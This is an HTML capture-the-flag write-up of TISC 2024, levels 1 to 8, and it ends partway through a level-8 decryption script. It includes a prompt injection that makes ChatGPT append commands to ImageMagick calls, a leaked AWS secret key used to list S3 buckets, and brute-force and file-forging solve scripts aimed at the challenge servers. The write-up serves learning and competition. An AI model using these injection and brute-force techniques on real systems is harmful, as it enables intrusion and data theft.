@@ -1,0 +1,1637 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		<link rel="stylesheet" type="text/css" href="./css/bootstrap.min.css">
+		<link rel="preconnect" href="https://fonts.googleapis.com">
+		<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+		<link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+		<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.6/styles/darkula.min.css">
+		<link rel="stylesheet" type="text/css" href="./css/style.css">
+
+		<title>Ryan Loh - CTF 2024 Writeup</title>
+	</head>
+	<body>
+
+
+		<div class="container">
+			<div class="row">
+				<div class="col-12">
+					<h1>Ryan Loh - TISC 2024 Writeup</h1>
+				</div>
+				<div class="col-12">
+					<img loading="lazy" class="w-100" src="./img/leaderboard.png" />
+				</div>
+				<div class="col-12">
+					<p>I made it to level 10 after countless days of stressful insomnia :(</p>
+
+					<p>I have learned a lot from this year’s challenges and am very grateful to CSIT and its organizers for giving me this awesome opportunity to explore and dive into the realms of cybersecurity. I would also like to congratulate those participants who made it into the same league as I am now 🙌. </p>
+
+					<p>Traversing through the challenges, few were easy, some were mediocre and most were tough. I enjoyed both the hardware and software challenges and it took me a few grueling days to solve but the notion of not giving up and striving to win always kept my sanity and my will intact. In the end, I would say it totally paid off!</p>
+				</div>
+			</div>
+		</div>
+
+		<div class="container">
+			<div class="row">
+				<div class="col-12">
+					<h1>Level 1 - Navigating the Digital Labyrinth</h1>
+				</div>
+
+				<div class="col-12">
+					<img loading="lazy" class="w-50" src="./img/level1/info.png" />
+				</div>
+
+				<div class="col-12">
+					<p>Navigating through social media, I pondered upon vi_vox223 on Instagram. At first glance, I knew I found it!</p>
+				</div>
+
+				<div class="col-12">
+					<img loading="lazy" class="w-50" src="./img/level1/1.png" />
+				</div>
+
+				<div class="col-12">
+					<p>Traversing through his stories, I found out he posted about a Discord bot ID</p>
+				</div>
+
+				<div class="col-12">
+					<img loading="lazy" class="w-50" src="./img/level1/2.png" />
+				</div>
+
+				<div class="col-12">
+					<p>After adding it to my Discord server, I tried messing with the commands provided</p>
+				</div>
+
+				<div class="col-12">
+					<img loading="lazy" class="w-50" src="./img/level1/3.png" />
+				</div>
+
+				<div class="col-12">
+					<p>One file caught my eye which was the Email .eml files</p>
+				</div>
+
+				<div class="col-12">
+					<img loading="lazy" class="w-50" src="./img/level1/4.png" />
+				</div>
+
+				<div class="col-12">
+					<p>Inputing the hex into Uber H3 reveals a mysterious location</p>
+				</div>
+
+				<div class="col-12">
+					<img loading="lazy" class="w-50" src="./img/level1/5.png" />
+				</div>
+
+				<div class="col-12">
+					<p>Clicking the Linkin link provided in the .eml files, we stumbled upon a suspicious Telegram bot. </p>
+				</div>
+
+				<div class="col-12">
+					<img loading="lazy" class="w-50" src="./img/level1/6.png" />
+				</div>
+
+				<p>Playing around with the bot, I tried many inputs but I quickly figured out it is asking for the name of the location on the Uber H3 coordinates. </p>
+
+				<div class="col-12">
+					<img loading="lazy" class="w-50" src="./img/level1/7.png" />
+				</div>
+
+				<div class="col-12">
+					<p>Inputing the location from Google Map we finally retreive the flag from the Telegram Bot</p>
+				</div>
+
+				<div class="col-12">
+					<img loading="lazy" class="w-50" src="./img/level1/8.png" />
+				</div>
+
+			</div>
+		</div>
+
+		<div class="container">
+			<div class="row">
+				<div class="col-12">
+					<h1>Level 2 - Language, Labyrinth and (Graphics)Magick</h1>
+				</div>
+
+				<div class="col-12">
+					<img loading="lazy" class="w-50" src="./img/level2/info.png" />
+				</div>
+
+				<div class="col-12">
+					<p>I encounted difficulties with this challenge because the server is slow but fortunately, the admins spun up more servers</p>
+				</div>
+
+				<div class="col-12">
+					<p>Interesting, I tried playing around with the input and quickly figured out that it is using ChatGPT to generate commands to feed into ImageMagick</p>
+				</div>
+
+				<div class="col-12">
+					<p>We can manipulate ChatGPT to append our malicious payload to the output and execute our own commands</p>
+				</div>
+
+				<div class="col-12">
+					<img loading="lazy" class="w-50" src="./img/level2/1.png" />
+				</div>
+
+				<div class="col-12">
+					<p>Entering to the temp file we get the flag. </p>
+				</div>
+
+				<div class="col-12">
+					<img loading="lazy" class="w-50" src="./img/level2/2.png" />
+				</div>
+
+			</div>
+		</div>
+
+		<div class="container">
+			<div class="row">
+				<div class="col-12">
+					<h1>Level 3 - Digging Up History</h1>
+				</div>
+
+				<div class="col-12">
+					<img loading="lazy" class="w-50" src="./img/level3/info.png" />
+				</div>
+
+				<div class="col-12">
+					<p>For this challenge, I used Forensic Toolkit by Accessdata to extract everything into a folder and used <code>grep</code> to find hidden flags</p>
+					<p>I <code>grep</code> couple of keywords such as <code>TISC{</code> and then <code>aws</code></p>
+				</div>
+
+				<div class="col-12">
+					<img loading="lazy" class="w-50" src="./img/level3/1.png" />
+				</div>
+
+				<div class="col-12">
+					<p>Upon entering <code>https://csitfan-chall.s3.amazonaws.com/flag.sus</code>, I downloaded a base64 encoded message which contains the flag</p>
+					<p>I <code>grep</code> couple of keywords such as <code>TISC{</code> and then <code>aws</code></p>
+				</div>
+
+				<div class="col-12">
+					<pre><code class="hljs bash">
+ryan@ColdChip:~$ echo 'VElTQ3t0cnUzXzFudDNybjN0X2gxc3QwcjEzXzg0NDU2MzJwcTc4ZGZuM3N9' | base64 -d
+TISC{tru3_1nt3rn3t_h1st0r13_8445632pq78dfn3s}
+					</code></pre>
+				</div>
+			</div>
+		</div>
+
+		<div class="container">
+			<div class="row">
+				<div class="col-12">
+					<h1>Level 4 - AlligatorPay</h1>
+				</div>
+
+				<div class="col-12">
+					<img loading="lazy" class="w-50" src="./img/level4/info.png" />
+				</div>
+
+				<div class="col-12">
+					<p>Upon analyzing the JavaScript, there are some decryption function for the uploaded file the user has uploaded </p>
+				</div>
+			
+				<div class="col-12">
+					<pre><code class="hljs javascript">
+async function decryptData(encryptedData, key, iv) {
+	const cryptoKey = await crypto.subtle.importKey(
+	  &quot;raw&quot;,
+	  key,
+	  { name: &quot;AES-CBC&quot; },
+	  false,
+	  [&quot;decrypt&quot;]
+	);
+	const decryptedBuffer = await crypto.subtle.decrypt(
+	  { name: &quot;AES-CBC&quot;, iv: iv },
+	  cryptoKey,
+	  encryptedData
+	);
+	return new DataView(decryptedBuffer);
+}
+					</code></pre>
+				</div>
+
+				<div class="col-12">
+					<p>Reverse engineering time! I have written some C code to encrypt(do the reverse) to generate the correct file</p>
+				</div>
+
+				<div class="col-12">
+					<pre><code class="hljs c">
+#include &lt;stdio.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;string.h&gt;
+#include &lt;openssl/evp.h&gt;
+#include &lt;openssl/aes.h&gt;
+#include &lt;arpa/inet.h&gt;
+#include "md5.h"
+
+#define MIN(x, y) (((x) &lt; (y)) ? (x) : (y))
+#define MAX(x, y) (((x) &gt; (y)) ? (x) : (y))
+
+#if __BIG_ENDIAN__
+# define htonll(x) (x)
+# define ntohll(x) (x)
+#else
+# define htonll(x) (((uint64_t)htonl((x) &amp; 0xFFFFFFFF) &lt;&lt; 32) | htonl((x) &gt;&gt; 32))
+# define ntohll(x) (((uint64_t)ntohl((x) &amp; 0xFFFFFFFF) &lt;&lt; 32) | ntohl((x) &gt;&gt; 32))
+#endif
+
+typedef struct  __attribute__((packed)) {
+	char header[5];
+	uint16_t version;
+	char key[32];
+	char reserved[10];
+	char iv[16];
+	char data[48];
+	char footer[6];
+	char checksum[16];
+} alligatorpay_t;
+
+typedef struct  __attribute__((packed)) {
+	char number[16];
+	uint32_t idontknow;
+	uint32_t expiry;
+	uint64_t balance;
+} card_t;
+
+int main(int argc, char const *argv[])
+{
+	/* code */
+
+	alligatorpay_t a = {
+		.header = "AGPAY",
+		.version = 0,
+		.footer = "ENDAGP"
+	};
+
+	card_t indata = {
+		.number = "1234567812345678",
+		.expiry = 0,
+		.balance = htonll(313371337l)
+	};
+    unsigned char outdata[1024];
+
+    int outLen1 = 0; 
+    int outLen2 = 0;
+
+	EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
+	EVP_EncryptInit(ctx, EVP_aes_256_cbc(), a.key, a.iv);
+
+	EVP_EncryptUpdate(ctx, outdata, &amp;outLen1, (unsigned char*)&amp;indata, sizeof(indata));
+	EVP_EncryptFinal(ctx, outdata + outLen1, &amp;outLen2);
+
+	printf("%i\n", outLen1 + outLen2);
+
+	memcpy(a.data, outdata, outLen1 + outLen2);
+
+	MD5_CTX md5;
+	md5_init(&amp;md5);
+	md5_update(&amp;md5, a.iv, sizeof(a.iv));
+	md5_update(&amp;md5, a.data, sizeof(a.data));
+	md5_final(&amp;md5, a.checksum);
+
+	FILE *fp = fopen("test.bin", "wb");  // create and/or overwrite
+	if(!fp) {
+		printf("Error in creating file. Aborting.\n");
+		return -2;
+	}
+
+	fwrite(&amp;a, sizeof(a), 1, fp);  
+
+	fclose(fp);
+
+
+	return 0;
+}
+					</code></pre>
+				</div>
+
+				<div class="col-12">
+					<p>Uploading the generated file, we get the flag. </p>
+				</div>
+
+				<div class="col-12">
+					<img loading="lazy" class="w-50" src="./img/level4/1.png" />
+				</div>
+
+			</div>
+		</div>
+
+		<div class="container">
+			<div class="row">
+				<div class="col-12">
+					<h1>Level 5 - Hardware isnt that Hard!</h1>
+				</div>
+
+				<div class="col-12">
+					<img loading="lazy" class="w-50" src="./img/level5/info.png" />
+				</div>
+
+				<div class="col-12">
+					<p>After a few days of frustration and no luck, I finally wrote a script to bruteforce the I2C address. </p>
+				</div>
+
+				<div class="col-12">
+					<pre><code class="hljs python">
+from pwn import *
+r = remote('chals.tisc24.ctf.sg', 61622)
+
+r.recvuntil('https://en.wikipedia.org/wiki/I%C2%B2C#Reference_design')
+r.recvline()
+r.recvline()
+
+for x in range(105, 128):
+	for i in range(0, 256):
+
+		ll = (x &lt;&lt; 1) | 0x00;
+		ly = (x &lt;&lt; 1) | 0x01;
+
+		payload = "SEND " + '{:02x}'.format(ll) + " " + '{:02x}'.format(i) + " " + '{:02x}'.format(ly)
+		print(payload)
+
+		r.sendline(payload)
+		r.sendline("RECV 32")
+		a = str(r.recvline())
+		if(a != "b'&gt; &gt; 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\\n'"):
+			print(a)
+			exit(0)
+					</code></pre>
+				</div>
+
+				<div class="col-12">
+					<p>Running the script, we seem to hit something at address <code>0xd243</code></p>
+				</div>
+
+				<div class="col-12">
+					<img loading="lazy" class="w-75" src="./img/level5/1.png" />
+				</div>
+
+				<div class="col-12">
+					<p>We can see why after decompiling, there are 3 registers that handle the requests <code>0x43</code>, <code>0x46</code> and <code>0x4d</code></p>
+				</div>
+
+				<div class="col-12">
+					<pre><code class="hljs c">
+
+/* WARNING: Globals starting with &amp;#39;_&amp;#39; overlap smaller symbols at the same address */
+
+void FUN_400d1614(uint param_1)
+
+{
+  byte bVar1;
+  int iVar2;
+  int iVar3;
+  byte bVar4;
+  uint uVar5;
+  int iVar6;
+  int in_WindowStart;
+  undefined auStack_30 [12];
+  uint uStack_24;
+  
+  memw();
+  memw();
+  uStack_24 = _DAT_3ffc20ec;
+  FUN_400d36ec(0x3ffc1ecc,s_i2c_recv_%d_byte(s):_3f400163,param_1);
+  iVar2 = (uint)(in_WindowStart == 0) * (int)auStack_30;
+  iVar3 = (uint)(in_WindowStart != 0) * (int)(auStack_30 + -(param_1 + 0xf &amp;amp; 0xfffffff0));
+  FUN_400d37e0(0x3ffc1cdc,iVar2 + iVar3,param_1);
+  FUN_400d2fa8(iVar2 + iVar3,param_1);
+  if (0 &amp;lt; (int)param_1) {
+    uVar5 = (uint)*(byte *)(iVar2 + iVar3);
+    if (uVar5 != 0x52) goto LAB_400d1689;
+    memw();
+    uRam3ffc1c80 = 0;
+  }
+  while( true ) {
+    uVar5 = uStack_24;
+    param_1 = _DAT_3ffc20ec;
+    memw();
+    memw();
+    if (uStack_24 == _DAT_3ffc20ec) break;
+    func_0x40082818();
+LAB_400d1689:
+    if (uVar5 == 0x46) {
+      iVar6 = 0;
+      do {
+        memw();
+        bVar1 = (&amp;amp;DAT_3ffbdb6a)[iVar6];
+        bVar4 = FUN_400d1508();
+        memw();
+        *(byte *)(iVar6 + 0x3ffc1c80) = bVar1 ^ bVar4;
+        iVar6 = iVar6 + 1;
+      } while (iVar6 != 0x10);
+    }
+    else if (uVar5 == 0x4d) {
+      memw();
+      uRam3ffc1c80 = DAT_3ffbdb7a;
+      memw();
+    }
+    else if ((param_1 != 1) &amp;amp;&amp;amp; (uVar5 == 0x43)) {
+      memw();
+      bVar1 = *(byte *)(*(byte *)(iVar2 + iVar3 + 1) + 0x3ffbdb09);
+      bVar4 = FUN_400d1508();
+      memw();
+      (&amp;amp;DAT_3ffc1c1f)[*(byte *)(iVar2 + iVar3 + 1)] = bVar1 ^ bVar4;
+    }
+  }
+  return;
+}
+
+
+					</code></pre>
+				</div>
+
+				<div class="col-12">
+					<p>Trying with register 0x46 and attempting to read data from it using address <code>0xd3</code>(first bit is set to read) reveals some data</p>
+				</div>
+
+				<div class="col-12">
+					<img loading="lazy" class="w-75" src="./img/level5/3.png" />
+				</div>
+
+				<div class="col-12">
+					<p>However, its gibberish</p>
+					<p>Digging further, we find another function that is used to XOR with the output</p>
+				</div>
+
+				<div class="col-12">
+					<pre><code class="hljs c">
+ushort FUN_400d1508(void)
+
+{
+  ushort uVar1;
+  
+  memw();
+  memw();
+  uVar1 = DAT_3ffbdb68 &lt;&lt; 7 ^ DAT_3ffbdb68;
+  memw();
+  memw();
+  memw();
+  uVar1 = uVar1 &gt;&gt; 9 ^ uVar1;
+  memw();
+  memw();
+  memw();
+  DAT_3ffbdb68 = uVar1 &lt;&lt; 8 ^ uVar1;
+  memw();
+  memw();
+  return DAT_3ffbdb68;
+}
+
+
+					</code></pre>
+				</div>
+
+				<div class="col-12">
+					<p>Writing C code to bruteforce with the output</p>
+				</div>
+
+				<div class="col-12">
+					<pre><code class="hljs c">
+#include &lt;stdio.h&gt;
+#include &lt;stdint.h&gt;
+
+uint16_t DAT_3ffbdb68 = 1;
+
+uint16_t unknown_procedure() {
+	uint16_t uVar1;
+	uVar1 = DAT_3ffbdb68 &lt;&lt; 7 ^ DAT_3ffbdb68;
+	uVar1 = uVar1 &gt;&gt; 9 ^ uVar1;
+	DAT_3ffbdb68 = uVar1 &lt;&lt; 8 ^ uVar1;
+	return DAT_3ffbdb68;
+}
+
+int main(int argc, char const *argv[]) {
+	/* code */
+
+	int z = 1;
+
+	while(1) {
+
+		DAT_3ffbdb68 = z;
+		z++;
+
+		char payload[] = {
+			0x91, 0x1f, 0x28, 0xb6, 0x47, 0x0c, 0x60, 0xcc, 0x9d, 0xca, 0xba, 0x17, 0x9f, 0x14, 0xa4, 0xdc
+		};
+
+		for(int i = 0; i &lt; sizeof(payload); ++i) {
+
+			uint16_t a = unknown_procedure();
+
+			payload[i] = (((char)a) ^ payload[i]) &amp; 0xff;
+		}
+
+		if(memcmp(payload, "TISC", 4) == 0) {
+			for(int i = 0; i &lt; sizeof(payload); ++i) {
+				printf("%c", payload[i]);
+			}
+			break;
+		}
+
+		printf("\n");
+	}
+
+	return 0;
+}
+					</code></pre>
+				</div>
+
+				<div class="col-12">
+					<p>We got the flag!</p>
+				</div>
+
+				<div class="col-12">
+					<pre><code class="hljs text">
+TISC{hwfuninnit}
+					</code></pre>
+				</div>
+
+			</div>
+		</div>
+
+		<div class="container">
+			<div class="row">
+				<div class="col-12">
+					<h1>Level 6 - Meownitoring</h1>
+				</div>
+
+				<div class="col-12">
+					<img loading="lazy" class="w-50" src="./img/level6/info.png" />
+				</div>
+
+				<div class="col-12">
+					<p>Level 6 is where it gets tough because I haven't done any cloud challenges before haha</p>
+				</div>
+
+				<div class="col-12">
+					<p>Given to us are a bunch of AWS CloudTrail logs and a readme file. The readme file contains a link to a website. </p>
+				</div>
+
+				<div class="col-12">
+					<pre><code class="hljs md">
+# Workplan
+Setup monitoring and logs analysis process for PALINDROME. 
+Compare products (we have 1 beta testing rights, need to source for others)
+
+## Product 1: Meownitoring (Beta Test)
+`https://d231g4hz442ywp.cloudfront.net`
+
+1. Any sensitive info in logs / monitoring? 
+2. How secure is the setup?
+3. Usefulness of dashboard? Buggy? 
+					</code></pre>
+				</div>
+
+				<div class="col-12">
+					<p>After creating an account on the website and playing around with it, there is a page that asks for an AWS arn which I then scurried through the logs and try each of them</p>
+				</div>
+
+				<div class="col-12">
+					<img loading="lazy" class="w-75" src="./img/level6/2.png" />
+				</div>
+
+				<div class="col-12">
+					<p>Out of the many arns, there is one <code>arn:aws:iam::637423240666:role/mewonitoring-lambda-test</code> which seems to print more logs</p>
+				</div>
+
+				<div class="col-12">
+					<img loading="lazy" class="w-75" src="./img/level6/3.png" />
+				</div>
+
+				<div class="col-12">
+					<p>We get out first clue as there is a secret key <code>e+4awZv0dnDaFeIbuvKkccqhjuNOr9iUb+gx/TMe</code> hidden in the logs</p>
+				</div>
+
+				<div class="col-12">
+					<p>The secret key has access to <code>s3://meownitoringtmpbucket</code> which I used it to list out the objects</p>
+				</div>
+
+				<div class="col-12">
+					<img loading="lazy" class="w-75" src="./img/level6/4.png" />
+				</div>
+
+				<div class="col-12">
+					<p>Anddddd, we found the first part of the flag <code>TISC{m@ny_inf0_frOm_l0gs_</code></p>
+				</div>
+
+				<div class="col-12">
+					<img loading="lazy" class="w-75" src="./img/level6/5.png" />
+				</div>
+
+				<div class="col-12">
+					<p>I browsed through other bucket and uncovered more logs</p>
+				</div>
+
+				<div class="col-12">
+					<img loading="lazy" class="w-75" src="./img/level6/6.png" />
+				</div>
+
+				<div class="col-12">
+					<p>And in the logs, there are AWS API Gateway created</p>
+				</div>
+
+				<div class="col-12">
+					<img loading="lazy" class="w-75" src="./img/level6/7.png" />
+				</div>
+
+				<div class="col-12">
+					<p>I'm lazy to traverse through every route so I created a Python script that can comb through every route in the log and attempt to do a HTTP request</p>
+				</div>
+
+				<div class="col-12">
+					<pre><code class="hljs python">
+import json
+import sys
+import os
+
+json_file_name = sys.argv[1]
+
+folder = sys.argv[1]
+
+directory = os.fsencode(folder)
+    
+for file in os.listdir(directory):
+	filename = folder + "/" + os.fsdecode(file)
+	if os.path.isfile(filename):
+
+		fp = open(filename)
+
+		data = json.load(fp)
+
+		for dictionary in data['Records']:
+			time = dictionary.get('eventTime')
+			source_ip = dictionary.get('sourceIPAddress')
+			event_name = dictionary.get('eventName')
+			user_type = dictionary.get('userIdentity').get('type')
+			user_accountid = dictionary.get('userIdentity').get('accountId')
+			user_arn = dictionary.get('userIdentity').get('arn')
+
+			print(time, source_ip, event_name, user_type, user_accountid, user_arn)
+
+		fp.close()
+					</code></pre>
+				</div>
+
+				<div class="col-12">
+					<p>I found the the second flag in <code>POST https://pxzfkfmjo7.execute-api.ap-southeast-1.amazonaws.com/5587y0s9d5aed/68fd47b8bf291eeea36480872f5ce29f0edb</code></p>
+				</div>
+
+				<div class="col-12">
+					<img loading="lazy" class="w-75" src="./img/level6/8.png" />
+				</div>
+
+				<div class="col-12">
+					<p>flags 1 + 2 combined: <code>TISC{m@ny_inf0_frOm_l0gs_&_me-0-wn1t0r1nNnG\\//[>^n^<]\\//}</code></p>
+				</div>
+			</div>
+		</div>
+
+		<div class="container">
+			<div class="row">
+				<div class="col-12">
+					<h1>Level 7 - WebAsmLite</h1>
+				</div>
+
+				<div class="col-12">
+					<img loading="lazy" class="w-50" src="./img/level7/info.png" />
+				</div>
+
+				<div class="col-12">
+					<p>I am looking forward to a VM based challenge in TISC2024 and it finally came true!!! </p>
+				</div>
+
+				<div class="col-12">
+					<p>Okay so I browse through the JS files provided and learnt that it is a custom ISA register based VM. It has basic instruction but the one that stands out is <code>READ</code> and <code>WRITE</code></p>
+					<p><code>READ</code> and <code>WRITE</code> is used to perform r/w operations to a custom implementation of a linear permission based file system passed in as an instance to the VM. </p>
+					<p>Furthur analysis, there are 2 routes <code>/submitdevjob</code> and <code>/requestadmin</code> but let's focus on <code>/requestadmin</code> as it contains the flag in the filesystem. </p>
+				</div>
+
+				<div class="col-12">
+					<img loading="lazy" class="w-75" src="./img/level7/1.png" />
+				</div>
+
+				<div class="col-12">
+					<p>1. The flag is created in flag.txt with admin(privlvl: 42) when the route <code>/requestadmin</code> is called</p>
+					<p>2. The instructions we input is executed in both admin and public VM. However the admin output is REDACTED</p>
+					<p>3. How can we access flag.txt with lower privlvl?</p>
+				</div>
+
+				<div class="col-12">
+					<p>Answer: Flag smuggling :D</p>
+				</div>
+
+				<div class="col-12">
+					<p>Explanation: we can bruteforce every combination of the flag and since we cannot see the admin output, we create a temp file in the filesystem and when we execute as public, we can see if the temp file exists as the boolean value of the combination existence</p>
+				</div>
+
+				<div class="col-12">
+					<p>Python code to bruteforce</p>
+				</div>
+
+				<div class="col-12">
+					<pre><code class="hljs python">
+import requests
+
+flag = ""
+
+for x in range(32, 64):
+	for i in range(0, 128):
+		payload = """
+READ:flag.txt;
+JNZ:0:9;
+
+IMM:0:$INDEX;
+LOAD:0:0;
+
+IMM:1:$STRING_TO_TEST;
+
+SUB:0:0:1;
+JZ:0:2;
+WRITE:SMUGGLE_LETTER_BY_LETTER;
+
+IMM:0:0;
+JZ:0:4;
+
+IMM:0:0;
+WRITE:SMUGGLE_LETTER_BY_LETTER;
+READ:SMUGGLE_LETTER_BY_LETTER;
+
+
+HALT;
+		"""
+
+		payload = payload.replace("$INDEX", str(x))
+		payload = payload.replace("$STRING_TO_TEST", str(i))
+
+		data = {
+		    'prgmstr': payload
+		}
+
+		headers = {
+		    'Content-Type': 'application/x-www-form-urlencoded'
+		}
+		response = requests.post("http://chals.tisc24.ctf.sg:50128/requestadmin", data=data, headers=headers)
+		reg0 = int(response.json()["userResult"]["vm_state"]["reg"].split(",")[0])
+
+		if reg0 == 0:
+			flag += chr(i)
+			print(flag)
+			break;
+					</code></pre>
+				</div>
+
+				<div class="col-12">
+					<p>Bellissimo! We got the flag!!!</p>
+				</div>
+
+				<div class="col-12">
+					<img loading="lazy" class="w-75" src="./img/level7/2.png" />
+				</div>
+			</div>
+		</div>
+
+		<div class="container">
+			<div class="row">
+				<div class="col-12">
+					<h1>Level 8 - Wallfacer</h1>
+				</div>
+
+				<div class="col-12">
+					<img loading="lazy" class="w-50" src="./img/level8/info.png" />
+				</div>
+
+				<div class="col-12">
+					<p>Omg!!! I was stuck in this challenge for 4 days and almost to the verge of giving up... but I made it anyways... </p>
+					<p>Here's how I solved it</p>
+				</div>
+
+				<div class="col-12">
+					<p>1. Given in the challenge is an APK file. </p>
+					<p>2. Challenge description says that there are things loaded only when the APK is run???</p>
+				</div>
+
+				<div class="col-12">
+					<p>After 4 days of frustration, I found some clues!!! </p>
+				</div>
+
+				<div class="col-12">
+					<pre><code class="hljs java">
+L_0x0030:
+	android.content.Context r12 = r12.b
+	r0 = 2131689528(0x7f0f0038, float:1.9008074E38)
+	java.lang.String r0 = r12.getString(r0)     // Catch:{ Exception -&gt; 0x006b }
+	java.lang.String r1 = new java.lang.String     // Catch:{ Exception -&gt; 0x006b }
+	r2 = 0
+	byte[] r0 = android.util.Base64.decode(r0, r2)     // Catch:{ Exception -&gt; 0x006b }
+	r1.&lt;init&gt;(r0)     // Catch:{ Exception -&gt; 0x006b }
+	java.nio.ByteBuffer r0 = defpackage.A8.K(r12, r1)     // Catch:{ Exception -&gt; 0x006b }
+	dalvik.system.InMemoryDexClassLoader r1 = new dalvik.system.InMemoryDexClassLoader     // Catch:{ Exception -&gt; 0x006b }
+	java.lang.ClassLoader r2 = r12.getClassLoader()     // Catch:{ Exception -&gt; 0x006b }
+	r1.&lt;init&gt;(r0, r2)     // Catch:{ Exception -&gt; 0x006b }
+	java.lang.String r0 = "DynamicClass"
+	java.lang.Class r0 = r1.loadClass(r0)     // Catch:{ Exception -&gt; 0x006b }
+	java.lang.Class&lt;android.content.Context&gt; r1 = android.content.Context.class
+	java.lang.Class[] r1 = new java.lang.Class[]{r1}     // Catch:{ Exception -&gt; 0x006b }
+	java.lang.String r2 = "dynamicMethod"
+	java.lang.reflect.Method r0 = r0.getMethod(r2, r1)     // Catch:{ Exception -&gt; 0x006b }
+	java.lang.Object[] r12 = new java.lang.Object[]{r12}     // Catch:{ Exception -&gt; 0x006b }
+	r1 = 0
+	r0.invoke(r1, r12)     // Catch:{ Exception -&gt; 0x006b }
+					</code></pre>
+				</div>
+
+
+				<div class="col-12">
+					<p>How is works: </p>
+					<p>1. R.strings.2131689528... is loaded as <code>data/sqlite.db </code>(fake sqlite file disguised as dex)</p>
+					<p>2. Decrypts <code>data/sqlite.db</code></p>
+					<p>3. Executes the decrypted payload using <code>InMemoryDexClassLoader</code></p>
+					<p>4. Decrypts encrypted native library chunks using AES GCM</p>
+					<p>5. Runs the native library</p>
+				</div>
+
+				<div class="col-12">
+					<p>I wrote a script and decrypt everything including the native library</p>
+				</div>
+
+
+				<div class="col-12">
+					<pre><code class="hljs java">
+import javax.crypto.Cipher;
+import javax.crypto.SecretKeyFactory;
+import javax.crypto.spec.GCMParameterSpec;
+import javax.crypto.spec.PBEKeySpec;
+import javax.crypto.spec.SecretKeySpec;
+
+import java.util.Base64;
+import java.io.File;
+import java.io.*;
+import java.nio.file.*;
+import java.nio.*;
+import java.io.ByteArrayOutputStream;
+
+
+class C0289q1 {
+    public int a;
+    public byte[] b;
+    public byte[] c;
+
+    public C0289q1(byte[] bArr) {
+        this.a = 17;
+        this.b = bArr;
+        this.c = new byte[256];
+        for (int i = 0; i &lt; 256; i++) {
+            ((byte[]) this.c)[i] = (byte) i;
+        }
+        int b2 = 0;
+        for (int i2 = 0; i2 &lt; 256; i2++) {
+            byte[] bArr2 = (byte[]) this.c;
+            byte b3 = bArr2[i2];
+            byte[] bArr3 = (byte[]) this.b;
+            b2 = (b2 + (b3 &amp; 255) + (bArr3[i2 % bArr3.length] &amp; 255)) &amp; 255;
+            bArr2[i2] = bArr2[b2];
+            bArr2[b2] = b3;
+        }
+    }
+
+}
+
+/* renamed from: Oa  reason: default package */
+public class Decrypt {
+
+
+    public static byte[] WTF(String str) throws Exception {
+        int i2;
+        InputStream open = new FileInputStream(new File(str));
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+        byte[] bArr = new byte[1024];
+        while (true) {
+            int read = open.read(bArr);
+            if (read == -1) {
+                break;
+            }
+            byteArrayOutputStream.write(bArr, 0, read);
+        }
+        open.close();
+        byte[] byteArray = byteArrayOutputStream.toByteArray();
+        byte[] bArr2 = new byte[128];
+        byte[] bArr3 = new byte[4];
+        System.arraycopy(byteArray, 4096, bArr3, 0, 4);
+        int i3 = ByteBuffer.wrap(bArr3).getInt();
+        byte[] bArr4 = new byte[i3];
+        System.arraycopy(byteArray, 4100, bArr4, 0, i3);
+        System.arraycopy(byteArray, 4100 + i3, bArr2, 0, 128);
+        C0289q1 q1Var = new C0289q1(bArr2);
+        byte[] bArr5 = new byte[i3];
+        int i4 = 0;
+        int b2 = 0;
+        for (i2 = 0; i2 &lt; i3; i2++) {
+            i4 = (i4 + 1) &amp; 255;
+            byte[] bArr6 = (byte[]) q1Var.c;
+            byte b3 = bArr6[i4];
+            b2 = (b2 + (b3 &amp; 255)) &amp; 255;
+            bArr6[i4] = bArr6[b2];
+            bArr6[b2] = b3;
+            bArr5[i2] = (byte) (bArr6[(bArr6[i4] + b3) &amp; 255] ^ bArr4[i2]);
+        }
+        return (bArr5);
+    }
+
+    public static byte[] a(byte[] bArr, String str, byte[] bArr2) throws Exception {
+        byte[] b = bb(str, bArr2);
+
+        Cipher instance = Cipher.getInstance("AES/GCM/NoPadding");
+        byte[] iv = new byte[12];
+        int length = bArr.length - 12;
+        byte[] bArr4 = new byte[length];
+        System.arraycopy(bArr, 0, iv, 0, 12);
+        System.arraycopy(bArr, 12, bArr4, 0, length);
+        instance.init(Cipher.DECRYPT_MODE, new SecretKeySpec(b, "AES"), new GCMParameterSpec(128, iv));
+        return instance.doFinal(bArr4);
+    }
+
+    private static byte[] bb(String str, byte[] bArr) throws Exception {
+        return SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256").generateSecret(new PBEKeySpec(str.toCharArray(), bArr, 16384, 256)).getEncoded();
+    }
+
+    public static void main(String[] args) {
+        try {
+            Path path = Paths.get("0$d4a1NDA5TkDcvPPA_97qGA");
+
+            byte[] data = Files.readAllBytes(path);
+
+            byte[] salt = Base64.getDecoder().decode("U1FMaXRlIGZvcm1hdCAzAA==");
+
+            byte[] b = Decrypt.WTF("sqlite.db");
+
+            System.out.println(b.length);
+
+            for(int i = 0; i &lt; 32; i++) {
+                System.out.print((char)(b[i] &amp; 0xFF));
+            }
+
+            OutputStream os = new FileOutputStream(new File("out.dex"));
+ 
+            os.write(b);
+ 
+            os.close();
+
+
+            String[] list = {
+                                "0$d4a1NDA5TkDcvPPA_97qGA", 
+                                "1$-jdd8_tomhupBCl9KWd8xA",  
+                                "2$lFLwXjQ9kfzjBqIAI43f-Q", 
+                                "3$JwwVFYd1_JvfrcL91sUOoQ",  
+                                "4$Xz61-8GuN_p5gECXlLwIyA",
+                                "5$Je3mRGwJ1MvkQ-ZXfApZgQ",
+                                "6$KrPqTP4Iu8-DNlpja70rcA",
+                                "7$K30_BnqsT-e6-qRdbWhW4Q",
+                                "8$svSIG6hueT4M509sCJTACQ"
+                            };
+
+            String str2 = "wallowinpain";
+            File file = new File("libnative.so");
+            FileOutputStream fileOutputStream = new FileOutputStream(file);
+            
+            for (String str3 : list) {
+
+                byte[] payload = Files.readAllBytes(Paths.get("data/" + str3));
+
+                str3 = str3.replace('_', '/');
